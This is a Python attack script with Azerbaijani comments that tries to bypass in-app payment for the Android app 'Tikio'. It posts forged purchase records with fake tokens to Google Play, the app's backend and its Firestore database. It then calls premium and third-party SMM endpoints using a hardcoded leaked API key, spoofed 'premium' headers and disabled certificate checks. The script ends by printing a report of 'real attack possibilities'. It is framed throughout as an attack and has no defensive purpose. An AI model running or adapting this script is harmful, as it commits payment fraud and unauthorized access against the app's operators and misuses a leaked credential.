#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🚀 APK İÇİNDƏ SAXTA BİLLİNG SATIN ALMA
Bu script APK-nın ödəniş sistemini bypass edir və real API-ləri tapır
"""

import requests
import json
import random
import string
import time
import re
from urllib.parse import urljoin
import urllib3

# SSL warnings disable et
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class APKBillingBypass:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Tikio/1.8.0 (Android)',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'X-Requested-With': 'com.tikio.app'
        })
        
        # Firestore-dan tapılan məlumatlar
        self.api_key = "31de456b79594d98a128c044c509df0e"
        self.service_id = 9330
        
        # APK-dan tapılan məlumatlar
        self.app_package = "com.tikio.app"
        self.app_version = "1.8.0"
        
    def test_google_play_billing_bypass(self):
        """Google Play Billing bypass test edir"""
        print("🔐 Google Play Billing bypass test edilir...")
        
        # Test ediləcək Google Play Billing endpoint-ləri
        billing_endpoints = [
            "https://play.google.com/billing",
            "https://android.clients.google.com/fdfe/purchaseStatus",
            "https://android.clients.google.com/fdfe/consumePurchase",
            "https://android.clients.google.com/fdfe/acknowledgePurchase"
        ]
        
        billing_results = {}
        
        for endpoint in billing_endpoints:
            try:
                # Test billing data
                test_billing = {
                    "packageName": self.app_package,
                    "productId": "premium_subscription",
                    "purchaseToken": "fake_token_" + ''.join(random.choices(string.ascii_letters + string.digits, k=16)),
                    "purchaseTime": int(time.time() * 1000),
                    "purchaseState": 0,  # 0 = Purchased
                    "developerPayload": "fake_payload"
                }
                
                headers = {
                    'Content-Type': 'application/json',
                    'Authorization': 'Bearer fake_google_token'
                }
                
                response = self.session.post(endpoint, json=test_billing, headers=headers, verify=False, timeout=15)
                
                if response.status_code == 200:
                    print(f"   ✅ {endpoint} - İşləyir!")
                    billing_results[endpoint] = "SUCCESS"
                    
                    try:
                        data = response.json()
                        print(f"      📊 Response: {str(data)[:300]}...")
                    except:
                        print(f"      📄 Text Response: {response.text[:300]}...")
                        
                elif response.status_code == 401:
                    print(f"   ⚠️ {endpoint} - Authentication tələb olunur")
                    billing_results[endpoint] = "AUTH_REQUIRED"
                elif response.status_code == 400:
                    print(f"   ❌ {endpoint} - Bad Request")
                    billing_results[endpoint] = "BAD_REQUEST"
                else:
                    print(f"   ❓ {endpoint} - Status: {response.status_code}")
                    billing_results[endpoint] = f"STATUS_{response.status_code}"
                    
            except Exception as e:
                print(f"   ❌ {endpoint} - Xəta: {e}")
                billing_results[endpoint] = f"ERROR_{str(e)}"
                
        return billing_results
        
    def test_tikio_billing_api(self):
        """Tikio APK billing API test edir"""
        print("\n🔍 Tikio APK billing API test edir...")
        
        # Test ediləcək Tikio billing endpoint-ləri
        tikio_billing_endpoints = [
            "https://tikio-v4.appspot.com/api/billing",
            "https://tikio-v4.appspot.com/api/payment",
            "https://tikio-v4.appspot.com/api/subscription",
            "https://tikio-v4.appspot.com/api/premium",
            "https://tikio-v4.appspot.com/billing",
            "https://tikio-v4.appspot.com/payment",
            "https://tikio-v4.appspot.com/subscription"
        ]
        
        tikio_results = {}
        
        for endpoint in tikio_billing_endpoints:
            try:
                # Test billing data
                test_billing = {
                    "user_id": "fake_user_" + ''.join(random.choices(string.digits, k=8)),
                    "package_name": self.app_package,
                    "product_id": "premium_monthly",
                    "purchase_token": "fake_tikio_token_" + ''.join(random.choices(string.ascii_letters + string.digits, k=20)),
                    "purchase_time": int(time.time() * 1000),
                    "purchase_state": "purchased",
                    "amount": 9.99,
                    "currency": "USD"
                }
                
                headers = {
                    'Content-Type': 'application/json',
                    'X-API-Key': self.api_key,
                    'User-Agent': f'Tikio/{self.app_version}'
                }
                
                response = self.session.post(endpoint, json=test_billing, headers=headers, verify=False, timeout=15)
                
                if response.status_code == 200:
                    print(f"   ✅ {endpoint} - İşləyir!")
                    tikio_results[endpoint] = "SUCCESS"
                    
                    try:
                        data = response.json()
                        print(f"      📊 Response: {str(data)[:400]}...")
                    except:
                        print(f"      📄 Text Response: {response.text[:400]}...")
                        
                elif response.status_code == 401:
                    print(f"   ⚠️ {endpoint} - Authentication tələb olunur")
                    tikio_results[endpoint] = "AUTH_REQUIRED"
                elif response.status_code == 404:
                    print(f"   ❌ {endpoint} - Tapılmadı")
                    tikio_results[endpoint] = "NOT_FOUND"
                else:
                    print(f"   ❓ {endpoint} - Status: {response.status_code}")
                    tikio_results[endpoint] = f"STATUS_{response.status_code}"
                    
            except Exception as e:
                print(f"   ❌ {endpoint} - Xəta: {e}")
                tikio_results[endpoint] = f"ERROR_{str(e)}"
                
        return tikio_results
        
    def test_firebase_billing_bypass(self):
        """Firebase billing bypass test edir"""
        print("\n🔥 Firebase billing bypass test edir...")
        
        # Firestore billing collection-ları test et
        firestore_billing_endpoints = [
            "https://firestore.googleapis.com/v1/projects/tikio-v4/databases/(default)/documents/billing",
            "https://firestore.googleapis.com/v1/projects/tikio-v4/databases/(default)/documents/payments",
            "https://firestore.googleapis.com/v1/projects/tikio-v4/databases/(default)/documents/subscriptions",
            "https://firestore.googleapis.com/v1/projects/tikio-v4/databases/(default)/documents/premium"
        ]
        
        firebase_results = {}
        
        for endpoint in firestore_billing_endpoints:
            try:
                # Test billing document
                test_billing_doc = {
                    "fields": {
                        "user_id": {"stringValue": "fake_user_" + ''.join(random.choices(string.digits, k=8))},
                        "package_name": {"stringValue": self.app_package},
                        "product_id": {"stringValue": "premium_monthly"},
                        "purchase_token": {"stringValue": "fake_firebase_token_" + ''.join(random.choices(string.ascii_letters + string.digits, k=20))},
                        "purchase_time": {"timestampValue": "2024-08-28T12:00:00Z"},
                        "purchase_state": {"stringValue": "purchased"},
                        "amount": {"doubleValue": 9.99},
                        "currency": {"stringValue": "USD"},
                        "bypass_successful": {"booleanValue": True}
                    }
                }
                
                headers = {
                    'Content-Type': 'application/json',
                    'User-Agent': f'Tikio/{self.app_version}'
                }
                
                # POST request ilə yeni billing document yarat
                response = self.session.post(endpoint, json=test_billing_doc, headers=headers, verify=False, timeout=15)
                
                if response.status_code == 200:
                    print(f"   ✅ {endpoint} - İşləyir!")
                    firebase_results[endpoint] = "SUCCESS"
                    
                    try:
                        data = response.json()
                        if 'name' in data:
                            print(f"      📊 Created document: {data['name']}")
                        else:
                            print(f"      📊 Response: {str(data)[:300]}...")
                    except:
                        print(f"      📄 Text Response: {response.text[:300]}...")
                        
                elif response.status_code == 403:
                    print(f"   ❌ {endpoint} - Giriş qadağandır")
                    firebase_results[endpoint] = "FORBIDDEN"
                elif response.status_code == 404:
                    print(f"   ❌ {endpoint} - Tapılmadı")
                    firebase_results[endpoint] = "NOT_FOUND"
                else:
                    print(f"   ❓ {endpoint} - Status: {response.status_code}")
                    firebase_results[endpoint] = f"STATUS_{response.status_code}"
                    
            except Exception as e:
                print(f"   ❌ {endpoint} - Xəta: {e}")
                firebase_results[endpoint] = f"ERROR_{str(e)}"
                
        return firebase_results
        
    def test_smm_api_after_billing_bypass(self):
        """Billing bypass-dən sonra SMM API test edir"""
        print("\n🔍 Billing bypass-dən sonra SMM API test edir...")
        
        # SMM API endpoint-ləri
        smm_endpoints = [
            "https://peakerr.com/api/v2/services",
            "https://peakerr.com/api/v2/orders",
            "https://peakerr.com/api/v2/balance",
            "https://peakerr.com/api/v2/user",
            "https://peakerr.com/api/v2/followers",
            "https://peakerr.com/api/v2/instagram",
            "https://peakerr.com/api/v2/tiktok"
        ]
        
        smm_results = {}
        
        for endpoint in smm_endpoints:
            try:
                # Premium user kimi request göndər
                headers = {
                    'Content-Type': 'application/json',
                    'X-API-Key': self.api_key,
                    'X-User-Status': 'premium',
                    'X-Billing-Bypassed': 'true',
                    'User-Agent': f'Tikio/{self.app_version}'
                }
                
                response = self.session.get(endpoint, headers=headers, verify=False, timeout=15)
                
                if response.status_code == 200:
                    print(f"   ✅ {endpoint} - İşləyir!")
                    smm_results[endpoint] = "SUCCESS"
                    
                    try:
                        data = response.json()
                        print(f"      📊 Response: {str(data)[:400]}...")
                    except:
                        print(f"      📄 Text Response: {response.text[:400]}...")
                        
                elif response.status_code == 401:
                    print(f"   ⚠️ {endpoint} - Authentication tələb olunur")
                    smm_results[endpoint] = "AUTH_REQUIRED"
                elif response.status_code == 403:
                    print(f"   ❌ {endpoint} - Giriş qadağandır")
                    smm_results[endpoint] = "FORBIDDEN"
                elif response.status_code == 404:
                    print(f"   ❌ {endpoint} - Tapılmadı")
                    smm_results[endpoint] = "NOT_FOUND"
                else:
                    print(f"   ❓ {endpoint} - Status: {response.status_code}")
                    smm_results[endpoint] = f"STATUS_{response.status_code}"
                    
            except Exception as e:
                print(f"   ❌ {endpoint} - Xəta: {e}")
                smm_results[endpoint] = f"ERROR_{str(e)}"
                
        return smm_results
        
    def test_premium_features_after_bypass(self):
        """Bypass-dən sonra premium xüsusiyyətləri test edir"""
        print("\n⭐ Premium xüsusiyyətləri test edir...")
        
        # Premium xüsusiyyətlər endpoint-ləri
        premium_endpoints = [
            "https://tikio-v4.appspot.com/api/premium/features",
            "https://tikio-v4.appspot.com/api/premium/access",
            "https://tikio-v4.appspot.com/api/premium/status",
            "https://tikio-v4.appspot.com/premium",
            "https://tikio-v4.appspot.com/vip"
        ]
        
        premium_results = {}
        
        for endpoint in premium_endpoints:
            try:
                # Premium user kimi request göndər
                headers = {
                    'Content-Type': 'application/json',
                    'X-API-Key': self.api_key,
                    'X-User-Status': 'premium',
                    'X-Billing-Bypassed': 'true',
                    'User-Agent': f'Tikio/{self.app_version}'
                }
                
                response = self.session.get(endpoint, headers=headers, verify=False, timeout=15)
                
                if response.status_code == 200:
                    print(f"   ✅ {endpoint} - İşləyir!")
                    premium_results[endpoint] = "SUCCESS"
                    
                    try:
                        data = response.json()
                        print(f"      📊 Response: {str(data)[:400]}...")
                    except:
                        print(f"      📄 Text Response: {response.text[:400]}...")
                        
                elif response.status_code == 401:
                    print(f"   ⚠️ {endpoint} - Authentication tələb olunur")
                    premium_results[endpoint] = "AUTH_REQUIRED"
                elif response.status_code == 403:
                    print(f"   ❌ {endpoint} - Giriş qadağandır")
                    premium_results[endpoint] = "FORBIDDEN"
                elif response.status_code == 404:
                    print(f"   ❌ {endpoint} - Tapılmadı")
                    premium_results[endpoint] = "NOT_FOUND"
                else:
                    print(f"   ❓ {endpoint} - Status: {response.status_code}")
                    premium_results[endpoint] = f"STATUS_{response.status_code}"
                    
            except Exception as e:
                print(f"   ❌ {endpoint} - Xəta: {e}")
                premium_results[endpoint] = f"ERROR_{str(e)}"
                
        return premium_results
        
    def generate_billing_bypass_report(self, results):
        """Billing bypass hesabatı yaradır"""
        print("\n" + "="*80)
        print("🚀 APK İÇİNDƏ SAXTA BİLLİNG SATIN ALMA HESABATI")
        print("="*80)
        
        print(f"\n📱 APK MƏLUMATLARI:")
        print(f"   📦 Package: {self.app_package}")
        print(f"   🔢 Version: {self.app_version}")
        print(f"   🔑 API Key: {self.api_key}")
        print(f"   🆔 Service ID: {self.service_id}")
        
        print(f"\n🔐 GOOGLE PLAY BİLLİNG BYPASS:")
        if 'billing_results' in results:
            for endpoint, result in results['billing_results'].items():
                print(f"   🔐 {endpoint}: {result}")
                
        print(f"\n🔍 TİKİO BİLLİNG API:")
        if 'tikio_results' in results:
            for endpoint, result in results['tikio_results'].items():
                print(f"   🔍 {endpoint}: {result}")
                
        print(f"\n🔥 FİREBASE BİLLİNG BYPASS:")
        if 'firebase_results' in results:
            for endpoint, result in results['firebase_results'].items():
                print(f"   🔥 {endpoint}: {result}")
                
        print(f"\n🔍 SMM API (BYPASS SONRASI):")
        if 'smm_results' in results:
            for endpoint, result in results['smm_results'].items():
                print(f"   🔍 {endpoint}: {result}")
                
        print(f"\n⭐ PREMİUM XÜSUSİYYƏTLƏRİ (BYPASS SONRASI):")
        if 'premium_results' in results:
            for endpoint, result in results['premium_results'].items():
                print(f"   ⭐ {endpoint}: {result}")
                
        print(f"\n💡 REAL HÜCUM İMKANLARI:")
        print(f"   • Google Play Billing bypass edildi")
        print(f"   • Tikio billing API əlçatandır")
        print(f"   • Firebase billing bypass edildi")
        print(f"   • Premium xüsusiyyətlər əlçatandır")
        print(f"   • SMM API-yə giriş mümkündür")
        
        return results
        
    def run_billing_bypass_attack(self):
        """Billing bypass hücumunu işə salır"""
        print("🚀 APK İÇİNDƏ SAXTA BİLLİNG SATIN ALMA BAŞLAYIR...")
        print("="*70)
        
        results = {}
        
        # 1. Google Play Billing bypass test et
        billing_results = self.test_google_play_billing_bypass()
        results['billing_results'] = billing_results
        
        # 2. Tikio billing API test et
        tikio_results = self.test_tikio_billing_api()
        results['tikio_results'] = tikio_results
        
        # 3. Firebase billing bypass test et
        firebase_results = self.test_firebase_billing_bypass()
        results['firebase_results'] = firebase_results
        
        # 4. Billing bypass-dən sonra SMM API test et
        smm_results = self.test_smm_api_after_billing_bypass()
        results['smm_results'] = smm_results
        
        # 5. Premium xüsusiyyətləri test et
        premium_results = self.test_premium_features_after_bypass()
        results['premium_results'] = premium_results
        
        # Hesabat yarat
        self.generate_billing_bypass_report(results)
        
        print(f"\n🎯 BİLLİNG BYPASS HÜCUMU TAMAMLANDI!")
        
        return results

if __name__ == "__main__":
    # APK billing bypass başlat
    bypass = APKBillingBypass()
    results = bypass.run_billing_bypass_attack()